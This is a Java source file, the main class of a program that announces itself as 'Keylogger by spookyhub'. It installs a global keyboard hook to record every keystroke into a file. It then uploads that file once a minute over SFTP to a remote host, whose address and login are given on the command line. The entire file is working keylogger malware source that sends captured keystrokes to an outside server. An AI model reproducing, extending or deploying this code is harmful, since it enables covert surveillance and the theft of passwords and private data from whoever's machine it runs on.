package App;

import Exceptions.CouldNotConnectToSshServerException;
import Exceptions.InvalidFileException;
import Service.KeyboardInputService;
import Service.SshService;
import Model.SshUser;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) {
        try {
            new Main().run(args);
        } catch (CouldNotConnectToSshServerException e) {
            System.out.println("Invalid ssh credentials");
        } catch (InvalidFileException e) {
            System.out.println("Invalid file given");
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            System.out.println("Error in the multithreading system please reach out for the owner");
        } catch (NumberFormatException e) {
            System.out.println("Invalid port input");
        }
    }

    public void run(String[] args) throws CouldNotConnectToSshServerException, InvalidFileException, NativeHookException, InterruptedException, NumberFormatException {
        validateArguments(args);
        SshService sshService = new SshService(
                new SshUser(
                        args[0],
                        args[1],
                        args[2],
                        Integer.parseInt(args[3])
                )
        );

        sshService.connect();
        if(!sshService.isConnected()) throw new CouldNotConnectToSshServerException();

        KeyboardInputService keyboardInputService = new KeyboardInputService(args[4]);
        GlobalScreen.registerNativeHook();
        GlobalScreen.getInstance().addNativeKeyListener(keyboardInputService);

        while (true){
            Thread.sleep(60000);
            sendInformation(sshService,keyboardInputService);
        }
    }

    private void validateArguments(String[] args) {
        System.out.println("Keylogger by spookyhub");
        if(args.length == 0) {
            System.out.println("Help menu:");
            System.out.println("to launch the application you need to give the following arguments");
            System.out.println("java -jar keylogger.jar {username} {host} {password} {port} {file_name}");
            System.exit(0);
        }
        if(args.length < 5){
            System.out.println("Please give all the following arguments to start {username} {host} {password} {port} {file_name}");
            System.exit(0);
        }
    }

    private void sendInformation(SshService sshService, KeyboardInputService keyboardInputService){
        System.out.println("Updating information for SSH server");
        sshService.sftp(
                keyboardInputService.getFilePath(),
                keyboardInputService.getFileName()
        );
    }
}
